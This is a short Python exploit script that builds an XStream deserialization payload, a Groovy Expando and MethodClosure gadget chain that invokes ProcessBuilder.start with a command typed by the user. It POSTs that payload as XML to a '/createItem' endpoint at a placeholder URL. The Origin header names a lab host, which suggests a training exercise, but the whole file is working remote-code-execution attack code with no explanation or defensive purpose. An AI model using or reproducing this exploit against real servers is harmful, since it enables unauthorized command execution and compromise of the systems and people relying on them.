import requests


def create_xml_payload(payload):
    payload = payload.split(" ")
    last = ""
    for i in range(len(payload)):
        last += f"""<string>{payload[i]}</string>"""

    str = f"""<map>
            <entry>
                <groovy.util.Expando>
                <expandoProperties>
                    <entry>
                    <string>hashCode</string>
                    <org.codehaus.groovy.runtime.MethodClosure>
                        <delegate class="groovy.util.Expando"/>
                        <owner class="java.lang.ProcessBuilder">
                        <command>
                        {last}
                        </command>
                        </owner>
                        <method>start</method>
                    </org.codehaus.groovy.runtime.MethodClosure>
                    </entry>
                </expandoProperties>
                </groovy.util.Expando>
                <int>1</int>
            </entry>
            </map>
        """
    return str


session = requests.session()

url = "https://put_url_here:443/createItem?name=test"
headers = {
    "Origin": "ptl-bf52a24e-5b88c155.libcurl.so",
    "Content-Type": "application/xml"
}
data = create_xml_payload(input("Enter payload: "))
print(data)
req = session.post(url, headers=headers, data=data)
print(req.status_code)